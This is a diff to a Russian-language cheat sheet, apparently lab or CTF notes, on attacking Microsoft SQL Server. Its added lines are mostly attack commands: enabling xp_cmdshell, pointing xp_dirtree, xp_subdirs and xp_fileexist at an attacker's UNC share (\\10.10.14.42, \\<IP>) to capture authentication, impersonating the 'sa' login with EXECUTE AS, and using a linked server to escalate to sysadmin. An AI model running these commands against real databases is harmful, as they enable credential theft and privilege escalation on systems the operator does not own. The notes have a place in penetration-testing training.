@@ -135,7 +135,7 @@ export KRB5CCNAME=sqlsvc.ccache
       use webshop
       enum_users
         
-* Включить вполнени xp_cmdshell
+* Включить вполнени xp_cmdshell и чтение каталогов
 
         enable_xp_cmdshell
 
@@ -144,6 +144,9 @@ export KRB5CCNAME=sqlsvc.ccache
         xp_cmdshell
 
         xp_dirtree "\\10.10.14.42\sass"  --- перейти по адресу с аутентификацией
+        EXEC xp_dirtree '\\<IP>\a';
+        EXEC xp_subdirs '\\<IP>\a';
+        EXEC xp_fileexist '\\<IP>\a';
 
         exec xp_dirtree 'c:/';
 
@@ -154,7 +157,12 @@ export KRB5CCNAME=sqlsvc.ccache
 * Проверить есть ли пользователи с правами олицетворения
 
       SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' 
+        SELECT name FROM sys.server_permissions JOIN sys.server_principals ON grantor_principal_id = principal_id WHERE permission_name = 'IMPERSONATE';
+* Имперсонификация
 
+      EXECUTE AS LOGIN = 'sa';
+        REVERT;
+  
 * Давайте переключимся на пользователя john и проверьте его привилегии.
 
        EXECUTE AS LOGIN = 'john';
@@ -164,6 +172,8 @@ export KRB5CCNAME=sqlsvc.ccache
         Джон не имеет прав системного администратора напрямую, но мы можем использовать связанный сервер для повышения наших прав. 
         EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
 
+        REVERT; -- переход к предыдущему пользователю
+  
 * Давайте проверим наличие локального связанного сервера
 
       SELECT srvname, isremote FROM sysservers
